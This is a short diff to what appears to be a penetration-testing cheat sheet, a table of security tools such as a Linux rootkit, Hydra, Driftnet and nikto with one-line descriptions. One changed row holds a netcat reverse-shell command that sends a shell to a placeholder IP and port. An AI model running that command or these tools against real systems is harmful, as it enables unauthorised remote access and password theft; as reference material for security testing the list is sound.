@@ -8,6 +8,8 @@ tags:
   - pentest
   - tools
 ---
+
+
 Name                      | description
 --------------------------|------------------------------------------------
 vlany                     | a Linux rootkit
@@ -23,7 +25,7 @@ etherape                  | GUI showing eth interface traffic
 Hydra                     | Password bruteforcing
 Driftnet                  | captures images sent on wire (non https)
 urlsnarf                  | captures HTTP requests
-nc -e /bin/sh <ip> <port> | sends a shell to the ip
+nc -e /bin/sh ip  port    | sends a shell to the ip
 nikto                     | web vulnrability checker
 dirb                      | web brute forcer
 crunch                    |  wordlist generator
